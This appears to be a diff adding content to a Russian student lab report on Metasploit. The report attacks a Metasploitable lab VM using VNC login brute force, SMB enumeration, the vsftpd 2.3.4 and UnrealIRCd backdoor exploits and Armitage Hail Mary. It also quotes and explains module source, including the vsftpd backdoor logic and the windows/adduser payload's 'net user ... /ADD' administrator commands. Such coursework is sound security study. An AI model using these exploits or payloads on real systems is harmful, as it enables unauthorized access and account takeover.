@@ -18,19 +18,424 @@
  	\clearpage
  	
  \section{Цель работы}
+ Изучать metasploit и освоить навыки практического применения.
  \section{Ход работы}
  \subsection{Изучение}
  \paragraph{Используя документацию изучать базовые понятия}
+ \begin{itemize}
+ 	\item auxiliary сканер, полчающий сведения о системе, основываясь на ее слабостях.
+ 	\item payload буквально "полезная нарузка". Эа программа выполняет вредоносные действия: разруршение и изменение данных, отправка ложных сообщений и т.д.
+ 	\item expoit - бувально, это программа, которая использует ошибки(неточности) программы для ее разрушения или управления.
+ 	\item shellcode - двоичный испольняемый код, обычно вызывает консоль.
+ 	\item nop - ассемблерная инструкция которая стопорит систему, говоря ей ничего не делать.
+ 	\item encoder - модули, обобщающие payload.
+ \end{itemize}
  \paragraph{Запустить msfconsole и узнать список допустимых команд}
+ \begin{verbatim}
+ 	service postgresql start
+ 	msfconsole
+ \end{verbatim}
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr1}
+ 	\caption{Список команд.}
+ \end{figure}
+ 
  \paragraph{Базовые команды search,info,load,use}
+ \begin{itemize}
+ 	\item search - без параметров- список всех эксплоитов, с параметром поиск эксплоита.
+ 	\item info - полная информация о эксплоите
+ 	\item load - команда для загрузки плагинов
+ 	\item use -команда для запуска эксплоита
+ \end{itemize}
  \paragraph{Команды по работе с эксплоитом}
+ \begin{itemize}
+ 	\item show exploits - список всех доступных на данный момент эксплоитов
+ 	\item show options - список доступных опций для эксплоита
+ 	\item exploit - запуск эксплоита
+ 	\item rexploit - перезапуск эксплоита
+ 	\item set RHOST - выделяем хост в сети для атаки
+ 	\item set RPORT - задаем METASPLOIT пори удаленой машины для подключения фреймворка
+ 	\item set payload - указывается имя используемого payload'a
+ 	\item set LPORT - задается номер порта для payload на атакуемом сервере.
+ \end{itemize}
  \paragraph{Команды по работе с бд}
- \paragraph{GUI оболоска ARMITAGE}
+ \begin{itemize}
+ 	\item db connect - подключение к бд
+ 	\item db status - проверка подключения к бд
+ 	\item db host - просмотр списка хостов в файле базы данных
+ 	\item db del host - удалить хост из бд
+ \end{itemize}
+ \paragraph{GUI оболоска ARMITAGE\\}
+ Графческая оболоска ARMITAGE позволяет в наглядном виде представить все этапы атаки, включая сканирование узлов сети, анализ защищенности обнаруженных ресурсов, выполнение эксплоитов и получение потного контроля над системой. 
  \paragraph{GUI веб-клиент}
+ Клиент доступен на порту 3790 после запуска apache.
  \subsection{Практическое задание}
  \paragraph{Подключиться к VCN серверу, получить доступ к консоли}
- \paragraph{Получить список директорий в общем доступе по протоколу SMB}
- \paragraph{Получить консоль используя vsftpd}
- \paragraph{Получить консоль используя уязвимость irc}
- \paragraph{Armitage Hail Mary}
+ \subparagraph{Просканируем порты на гостевой ос metasploitable.\\}
+ Команда:
+ \begin{verbatim}
+ 	nmap 192.168.150.3 -sV
+ \end{verbatim}
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr1-5}
+ 	\caption{Сканирование metasploitable.}
+ \end{figure}
+ 
+ Видно, что VCN сервер располагается на порте 5900.
+ 
+ В msfconsole воспользуемся командой:
+ \begin{verbatim}
+ 	search "VNC (protocol 3.3)
+ \end{verbatim}
+  
+  \begin{figure}[h!]
+  	\centering
+  	\includegraphics[width =\linewidth]{scr2}
+  	\caption{Поиск эксплоитов vcn.}
+  \end{figure}
+  
+  Как видно из рисунка 3 присутствуем много эксплоитов. По каждому можно получить информацию командой \verb'info <exploit_name>'
+ 
+ \subparagraph{Воспользуемся 'auxiliary/scanner/vnc/vnc login'\\}
+ 
+ Для этого введем команду \verb'use auxiliary/scanner/vnc/vnc_login'
+ 
+ Установим необходимые параметры \verb'set RHOSTS 192.168.150.3'
+ 
+ Запустим exploit - \verb'exploit'
+ 
+  \begin{figure}[h!]
+  	\centering
+  	\includegraphics[width =\linewidth]{scr3}
+  	\caption{Работа эксплоита.}
+  \end{figure}
+ 
+ \subparagraph{Запустим vcnviewer\\}
+ Команда: \verb'vncviewer 192.168.150.3:5900'
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr4}
+ 	\caption{Работа vcnviewer.}
+ \end{figure}
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr5}
+ 	\caption{Работа через vcnviewer.}
+ \end{figure}
+ 
+ \paragraph{Получить список директорий в общем доступе по протоколу SMB\\}
+ \subparagraph{Переключимся на другой эксплоит.\\}
+ Подкоючим новый эксплоит.
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr6}
+ 	\caption{Переход на новый эксплоит.}
+ \end{figure}
+ \subparagraph{Запустим его.\\}
+ Запуск эксплоита.
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr7}
+ 	\caption{Работа эксплоита.}
+ \end{figure}
+ \paragraph{Получить консоль используя vsftpd\\}
+ Для данной операции выберем auxiliary: \verb'exploit/unix/ftp/vsftpd_234_backdoor'
+ 
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr8}
+ 	\caption{Работа эксплоита.}
+ \end{figure}
+ 
+ \paragraph{Получить консоль используя уязвимость irc\\}
+ Для данной операции выберем exploit: \verb'exploit/unix/irc/unreal\_ircd\_3281\_backdoor'
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr9}
+ 	\caption{Работа эксплоита.}
+ \end{figure}
+ \paragraph{Armitage Hail Mary\\}
+ Запустим Armitage. Выберем в качестве жертвы хост 192.168.150.3 и в меню Attacks->Hail Mary. После запуска функция hail mary проводит ”умную” атаку. 
+ \begin{figure}[h!]
+ 	\centering
+ 	\includegraphics[width =\linewidth]{scr10}
+ 	\caption{Работа Armitage Hail Mary.}
+ \end{figure}
+ 
+ \subsection{Изучить три файла с исходным кодом эксплойитов или служебных скриптов на ruby и описать, что в них происходит}
+ 
+ Путь к модулям: \verb'/usr/share/metasploit-framework/modules/'.
+ 
+ Путь к файлам фреймворка: \verb'/usr/share/metasploit-framework/metasploit/framework/'.
+ 
+ Путь к ядру: \verb'/usr/share/metasploit-framework/msf/core'.
+ 
+ \begin{itemize}
+ 	
+ 	\item Расмотрим модуль axuiliary для brute-force сканирования логина по протоколу ftp - \verb'auxiliary/scaner/ftp/ftp_login'.
+ 	
+ 	Путь к файлу: \verb'/usr/share/metasploit-framework/modules/auxiliary/scaner/ftp/ftp_login.rb'
+ 	
+ 	В самом начале определяются описываются зависимости от модулей:
+ 	
+ 	\begin{verbatim}
+ 	require 'msf/core'	# ядро msf
+ 	require 'metasploit/framework/credential_collection' # класс для хранения учетных данных и получения их из файла
+ 	require 'metasploit/framework/login_scanner/ftp' # ftp сканер
+ 	\end{verbatim}
+ 	
+ 	Далее следует описание класса, наследуемого от \verb'Msf::Auxiliary'.
+ 	
+ 	\begin{verbatim}
+ 	class Metasploit3 < Msf::Auxiliary
+ 	\end{verbatim}
+ 	
+ 	Затем добавляются чтобы добавить методы экземпляра класса, для этого прописываются команды include соответствующих модулей:
+ 	
+ 	\begin{verbatim}
+ 	include Msf::Exploit::Remote::Ftp
+ 	include Msf::Auxiliary::Scanner
+ 	include Msf::Auxiliary::Report
+ 	include Msf::Auxiliary::AuthBrute
+ 	\end{verbatim}
+ 	
+ 	В методе initialize прописываются описание модуля: 
+ 	
+ 	\begin{verbatim}
+ 	super(
+ 	'Name'        => 'FTP Authentication Scanner',
+ 	'Description' => %q{
+ 	This module will test FTP logins on a range of machines and
+ 	report successful logins.  If you have loaded a database plugin
+ 	and connected to a database this module will record successful
+ 	logins and hosts so you can track your access.
+ 	},
+ 	'Author'      => 'todb',
+ 	'References'     =>
+ 	[
+ 	[ 'CVE', '1999-0502'] # Weak password
+ 	],
+ 	'License'     => MSF_LICENSE
+ 	)
+ 	\end{verbatim}
+ 	
+ 	А так же опции: 
+ 	
+ 	\begin{verbatim}
+ 	register_options(
+ 	[
+ 	Opt::Proxies,
+ 	Opt::RPORT(21),
+ 	OptBool.new('RECORD_GUEST', [ false, "Record anonymous/guest logins to the database", false])
+ 	], self.class)
+ 	
+ 	register_advanced_options(
+ 	[
+ 	OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false])
+ 	]
+ 	)
+ 	
+ 	deregister_options('FTPUSER','FTPPASS') # Can use these, but should use 'username' and 'password'
+ 	@accepts_all_logins = {}
+ 	\end{verbatim}
+ 	
+ 	Далее следует метод run\_host, который и производит сканирование. Сначала выводиться информация, что сканирование началось:
+ 	
+ 	\begin{verbatim}
+ 	print_status("#{ip}:#{rport} - Starting FTP login sweep")
+ 	\end{verbatim}
+ 	
+ 	Создаетются экземпляры учетных данных и сканера:
+ 	
+ 	\begin{verbatim}
+ 	cred_collection = Metasploit::Framework::CredentialCollection.new(
+ 	blank_passwords: datastore['BLANK_PASSWORDS'],
+ 	pass_file: datastore['PASS_FILE'],
+ 	password: datastore['PASSWORD'],
+ 	user_file: datastore['USER_FILE'],
+ 	userpass_file: datastore['USERPASS_FILE'],
+ 	username: datastore['USERNAME'],
+ 	user_as_pass: datastore['USER_AS_PASS'],
+ 	prepended_creds: anonymous_creds
+ 	)
+ 	
+ 	cred_collection = prepend_db_passwords(cred_collection)
+ 	
+ 	scanner = Metasploit::Framework::LoginScanner::FTP.new(
+ 	host: ip,
+ 	port: rport,
+ 	proxies: datastore['PROXIES'],
+ 	cred_details: cred_collection,
+ 	stop_on_success: datastore['STOP_ON_SUCCESS'],
+ 	bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+ 	max_send_size: datastore['TCP::max_send_size'],
+ 	send_delay: datastore['TCP::send_delay'],
+ 	connection_timeout: 30,
+ 	framework: framework,
+ 	framework_module: self,
+ 	)
+ 	\end{verbatim}
+ 	
+ 	И непосредственно сканирование:
+ 	
+ 	\begin{verbatim}
+ 	scanner.scan! do |result|
+ 	credential_data = result.to_h
+ 	credential_data.merge!(
+ 	module_fullname: self.fullname,
+ 	workspace_id: myworkspace_id
+ 	)
+ 	if result.success?
+ 	credential_core = create_credential(credential_data)
+ 	credential_data[:core] = credential_core
+ 	create_credential_login(credential_data)
+ 	
+ 	print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
+ 	else
+ 	invalidate_login(credential_data)
+ 	vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
+ 	end
+ 	end
+ 	\end{verbatim}
+ 	
+ 	
+ 	
+ 	\item Далее рассмотрим exploit - vsftpd\_234\_backdoor. 
+ 	
+ 	Путь: \verb'/usr/share/metasploit-framework/modules/exploit/unix/ftp/vsftd_234_backdoor.rb'.
+ 	
+ 	Здесь все аналогично, остановимся на логике эксплоита.
+ 	
+ 	Сначала происодит попытка подключения по порту 6200.
+ 	
+ 	\begin{verbatim}
+ 	nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
+ 	if nsock
+ 	print_status("The port used by the backdoor bind listener is already open")
+ 	handle_backdoor(nsock)
+ 	return
+ 	end
+ 	\end{verbatim}
+ 	
+ 	Далее, если сокет открыт на ftp сервер отправляется рандомный пользователь и пароль, так же осуществляются проверки на доступ только анонимным пользователям и на ответ сервера:
+ 	
+ 	\begin{verbatim}
+ 	sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
+ 	resp = sock.get_once(-1, 30).to_s
+ 	print_status("USER: #{resp.strip}")
+ 	
+ 	if resp =~ /^530 /
+ 	print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
+ 	disconnect
+ 	return
+ 	end
+ 	
+ 	if resp !~ /^331 /
+ 	print_error("This server did not respond as expected: #{resp.strip}")
+ 	disconnect
+ 	return
+ 	end
+ 	
+ 	sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")
+ 	\end{verbatim}
+ 	
+ 	Далее не получая ответа на ввод пароля просто пытаемся запустить backdoor:
+ 	
+ 	\begin{verbatim}
+ 	nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
+ 	if nsock
+ 	print_good("Backdoor service has been spawned, handling...")
+ 	handle_backdoor(nsock)
+ 	return
+ 	end
+ 	\end{verbatim}
+ 	
+ 	Payload запускается в методе handle\_backdoor:
+ 	
+ 	\begin{verbatim}
+ 	def handle_backdoor(s)
+ 	
+ 	s.put("id\n")
+ 	
+ 	r = s.get_once(-1, 5).to_s
+ 	if r !~ /uid=/
+ 	print_error("The service on port 6200 does not appear to be a shell")
+ 	disconnect(s)
+ 	return
+ 	end
+ 	
+ 	print_good("UID: #{r.strip}")
+ 	
+ 	s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
+ 	handler(s)
+ 	end
+ 	\end{verbatim}
+ 	
+ 	
+ 	\item Рассмотрим payload - windows/adduser.
+ 	
+ 	Данный payload создает пользователя в системе windows, с заранее заданными настройками.
+ 	
+ 	Путь: \verb'/usr/share/metasploit-framework/modules/payload/singles/windows/adduser.rb'.
+ 	
+ 	Сначала прописаны опции: 
+ 	
+ 	\begin{verbatim}
+ 	register_options(
+ 	[
+ 	OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
+ 	OptString.new('PASS', [ true, "The password for this user", "Metasploit$1" ]),
+ 	OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
+ 	OptBool.new('WMIC',	 [ true, "Use WMIC on the target to resolve administrators group", false ]),
+ 	], self.class)
+ 	register_advanced_options(
+ 	[
+ 	OptBool.new("COMPLEXITY", [ true, "Check password for complexity rules", true ]),
+ 	], self.class)
+ 	\end{verbatim}
+ 	Далее в зависимости от введных опций генерируется код который должен быть запущен на компьтере жертве в командной строке:
+ 	\begin{verbatim}
+ 	def command_string
+ 	user = datastore['USER'] || 'metasploit'
+ 	pass = datastore['PASS'] || ''
+ 	cust = datastore['CUSTOM'] || ''
+ 	wmic = datastore['WMIC']
+ 	complexity= datastore['COMPLEXITY']
+ 	if(pass.length > 14)
+ 	raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
+ 	end
+ 	if complexity and pass !~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/
+ 	raise ArgumentError, "Password: #{pass} doesn't meet complexity requirements and may cause issues"
+ 	end
+ 	
+ 	if not cust.empty?
+ 	print_status("Using custom group name #{cust}")
+ 	return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+ 	"net localgroup \"#{cust}\" #{user} /ADD"
+ 	elsif wmic
+ 	print_status("Using WMIC to discover the administrative group name")
+ 	return "cmd.exe /c \"FOR /F \"usebackq tokens=2* skip=1 delims==\" " +
+ 	"%G IN (`wmic group where sid^='S-1-5-32-544' get name /Value`); do " +
+ 	"FOR /F \"usebackq tokens=1 delims==\" %X IN (`echo %G`); do " +
+ 	"net user #{user} #{pass} /ADD && " +
+ 	"net localgroup \"%X\" #{user} /ADD\""
+ 	else
+ 	return "cmd.exe /c net user #{user} #{pass} /ADD && " +
+ 	"net localgroup Administrators #{user} /ADD"
+ 	end
+ 	
+ 	end
+ 	\end{verbatim}
+ 	
+ 	
+ 	
+ \end{itemize}
+ 
+ \section{Вывод}
+ 
+ После выполнения работы были изучены основные принципы работы с metasploit-framework, в основном через интерфейс msfconsole. Так же пришлось поработать через интерфейс armitage. С практической стороны были изучены методы сканирования хостов и получения к ним доступа, рассмотрены типичные атаки. Изучены основы работы с эксплоитами и код некоторых модулей.
+ 
+ 
  \end{document}
